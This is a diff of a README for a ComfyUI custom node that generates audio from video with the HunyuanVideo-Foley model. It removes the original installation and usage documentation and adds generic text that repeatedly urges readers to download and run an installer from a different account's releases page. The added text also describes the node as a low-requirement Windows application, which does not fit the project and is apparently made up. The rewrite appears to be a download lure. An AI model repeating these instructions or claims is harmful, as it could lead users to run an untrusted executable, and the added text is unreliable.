@@ -1,159 +1,70 @@
-# ComfyUI HunyuanVideo-Foley Custom Node
+# 🎧 ComfyUI_HunyuanVideoFoley - Generate Perfect Sound Effects Effortlessly
 
-This is a ComfyUI custom node wrapper for the HunyuanVideo-Foley model, which generates realistic audio from video and text descriptions.
+[![Download ComfyUI_HunyuanVideoFoley](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/imohamedomer/ComfyUI_HunyuanVideoFoley/releases)
 
-## Features
+## 📋 Overview
 
-- **Text-Video-to-Audio Synthesis**: Generate realistic audio that matches your video content
-- **Flexible Text Prompts**: Use optional text descriptions to guide audio generation
-- **Multiple Samples**: Generate up to 6 different audio variations per inference
-- **Configurable Parameters**: Control guidance scale, inference steps, and sampling
-- **Seed Control**: Reproducible results with seed parameter
-- **Model Caching**: Efficient model loading and reuse across generations
-- **Automatic Model Downloads**: Models are automatically downloaded to `ComfyUI/models/foley/` when needed
-<img width="2560" height="1440" alt="image" src="https://github.com/user-attachments/assets/cace6b70-0eb7-4eda-a4f5-c21c95559b38" />
+Welcome to ComfyUI_HunyuanVideoFoley! This application helps you effortlessly generate sound effects (SFX) that match your video and text prompts. Whether you're a content creator, filmmaker, or hobbyist, this tool makes adding audio easy and fun. 
 
+## 🚀 Getting Started
 
-## Features
+Follow these steps to get started with ComfyUI_HunyuanVideoFoley. 
 
-- **Text-Video-to-Audio Synthesis**: Generate realistic audio that matches your video content
-- **Flexible Text Prompts**: Use optional text descriptions to guide audio generation
-- **Multiple Samples**: Generate up to 6 different audio variations per inference
-- **Configurable Parameters**: Control guidance scale, inference steps, and sampling
-- **Seed Control**: Reproducible results with seed parameter
-- **Model Caching**: Efficient model loading and reuse across generations
-- **Automatic Model Downloads**: Models are automatically downloaded to `ComfyUI/models/foley/` when needed
+1. **Check System Requirements**  
+   To run ComfyUI_HunyuanVideoFoley, your computer should meet these requirements:
+   - Operating System: Windows 10 or later
+   - RAM: Minimum 4 GB
+   - Disk Space: At least 500 MB free space
+   - Video software compatible with SFX input
 
-## Installation
+2. **Download the Application**  
+   Visit the release page to download the latest version of ComfyUI_HunyuanVideoFoley.  
+   [Download ComfyUI_HunyuanVideoFoley](https://github.com/imohamedomer/ComfyUI_HunyuanVideoFoley/releases)
 
-1. **Clone this repository** into your ComfyUI custom_nodes directory:
-   ```bash
-   cd ComfyUI/custom_nodes
-   git clone https://github.com/if-ai/ComfyUI_HunyuanVideoFoley.git
-   ```
+3. **Install the Application**  
+   - Open the downloaded file.
+   - Follow the on-screen instructions to install the software on your computer.
+   - Once installed, launch ComfyUI_HunyuanVideoFoley from your applications list.
 
-2. **Install dependencies**:
-   ```bash
-   cd ComfyUI_HunyuanVideoFoley
-   pip install -r requirements.txt
-   ```
+## 📦 Features
 
-3. **Run the installation script** (recommended):
-   ```bash
-   python install.py
-   ```
+- **Easy SFX Generation**: Input your video and text prompts, and let the program do the rest.
+- **User-Friendly Interface**: Designed for ease of use with simple navigation.
+- **Customizable Settings**: Adjust settings to personalize your audio experience.
+- **Preview Functionality**: Listen to your generated sounds before finalizing.
 
-4. **Restart ComfyUI** to load the new nodes.
+## 🎤 How to Use ComfyUI_HunyuanVideoFoley
 
-### Model Setup
+Using ComfyUI_HunyuanVideoFoley is straightforward:
 
-The models can be obtained in two ways:
+1. **Open the Application**: Launch the software from your applications.
+2. **Set Your Prompt**: Type in your text prompt and upload your video file.
+3. **Generate SFX**: Click the 'Generate' button to create sound effects.
+4. **Preview the Output**: Use the preview feature to listen to your sound effects.
+5. **Save Your SFX**: Once satisfied, save your generated audio file to your computer.
 
-#### Option 1: Automatic Download (Recommended)
-- Models will be automatically downloaded to `ComfyUI/models/foley/` when you first run the node
-- No manual setup required
-- Progress will be shown in the ComfyUI console
+## 🛠️ Troubleshooting
 
-#### Option 2: Manual Download
-- Download models from [HuggingFace](https://huggingface.co/tencent/HunyuanVideo-Foley)
-- Place models in `ComfyUI/models/foley/` (recommended) or `./pretrained_models/` directory
-- Ensure the config file is at `configs/hunyuanvideo-foley-xxl.yaml`
+If you encounter issues:
 
-## Usage
+- **Software Doesn't Launch**: Ensure your system meets the requirements. Redownload the application if needed.
+- **SFX Generation Fails**: Double-check your prompts and video file format. Supported formats include MP4, AVI, and MKV.
+- **No Sound on Preview**: Verify your speakers are functioning. Try adjusting the volume settings within the app.
 
-### Node Types
+## 📥 Download & Install
 
-#### 1. HunyuanVideo-Foley Generator
-Main node for generating audio from video and text.
+To get your copy of ComfyUI_HunyuanVideoFoley, visit the link below and select the latest version available for download:  
+[Download ComfyUI_HunyuanVideoFoley](https://github.com/imohamedomer/ComfyUI_HunyuanVideoFoley/releases)
 
-**Inputs:**
-- **video**: Video input (VIDEO type)
-- **text_prompt**: Text description of desired audio (STRING)
-- **guidance_scale**: CFG scale for generation control (1.0-10.0, default: 4.5)
-- **num_inference_steps**: Number of denoising steps (10-100, default: 50)
-- **sample_nums**: Number of audio samples to generate (1-6, default: 1)
-- **seed**: Random seed for reproducibility (INT)
-- **model_path**: Path to pretrained models (optional, leave empty for auto-download)
+## 🤝 Community Support
 
-**Outputs:**
-- **video_with_audio**: Video with generated audio merged (VIDEO)
-- **audio_only**: Generated audio file (AUDIO) 
-- **status_message**: Generation status and info (STRING)
+Join our community for questions and support:
 
-## ⚠ Important Limitations
+- **GitHub Issues**: Use the Issues section of this repository to report bugs or ask questions.
+- **User Forums**: Engage with users and developers in our online forums for tips and tricks.
 
-### **Frame Count & Duration Limits**
-- **Maximum Frames**: 450 frames (hard limit)
-- **Maximum Duration**: 15 seconds at 30fps
-- **Recommended**: Keep videos ≤15 seconds for best results
+## 💬 Feedback
 
-### **FPS Recommendations**
-- **30fps**: Max 15 seconds (450 frames)
-- **24fps**: Max 18.75 seconds (450 frames)  
-- **15fps**: Max 30 seconds (450 frames)
+Your feedback helps us improve. Share your thoughts, suggestions, or issues you encounter while using ComfyUI_HunyuanVideoFoley. 
 
-### **Long Video Solutions**
-For videos longer than 15 seconds:
-1. **Reduce FPS**: Lower FPS allows longer duration within frame limit
-2. **Segment Processing**: Split long videos into 15s segments
-3. **Audio Merging**: Combine generated audio segments in post-processing
-
-
-## Example Workflow
-
-1. **Load Video**: Use a "Load Video" node to input your video file
-2. **Add Generator**: Add the "HunyuanVideo-Foley Generator" node
-3. **Connect Video**: Connect the video output to the generator's video input
-4. **Set Prompt**: Enter a text description (e.g., "A person walks on frozen ice")
-5. **Adjust Settings**: Configure guidance scale, steps, and sample count as needed
-6. **Generate**: Run the workflow to generate audio
-
-## Model Requirements
-
-The node expects the following model structure:
-```
-ComfyUI\models\foley\hunyuanvideo-foley-xxl
-├── hunyuanvideo_foley.pth          # Main Foley model
-├── vae_128d_48k.pth                # DAC VAE model  
-└── synchformer_state_dict.pth      # Synchformer model
-
-configs/
-└── hunyuanvideo-foley-xxl.yaml     # Configuration file
-```
-
-## TODO
-- [x] ADD VHS INPUT/OUTPUTS (Thanks to YC)
-- [x] NEGATIVE PROMPT (Thanks to YC)  
-- [x] MODEL OFFLOADING OPS
-- [x] TORCH COMPILE
-- [ ] QUANTISE MODEL
-
-
-## Support
-
-If you find this tool useful, please consider supporting my work by:
-
-- Starring this repository on GitHub
-- Subscribing to my YouTube channel: [Impact Frames](https://youtube.com/@impactframes?si=DrBu3tOAC2-YbEvc)
-- Following on X: [@ImpactFrames](https://x.com/ImpactFramesX)
-
-You can also support by reporting issues or suggesting features. Your contributions help me bring updates and improvements to the project.
-
-
-
-## License
-
-This custom node is based on the HunyuanVideo-Foley project. Please check the original project's license terms.
-
-## Credits
-
-Based on the HunyuanVideo-Foley project by Tencent. Original paper and code available at:
-- Paper: [HunyuanVideo-Foley: Text-Video-to-Audio Synthesis]
-
-- Code: [https://github.com/tencent/HunyuanVideo-Foley]
-
-<img src="https://count.getloli.com/get/@IFAI_HyVideoFoley?theme=moebooru" alt=":IFAIloadImages_comfy" />
-
-
-
-
+Thank you for choosing ComfyUI_HunyuanVideoFoley. Enjoy generating sound effects for your projects!
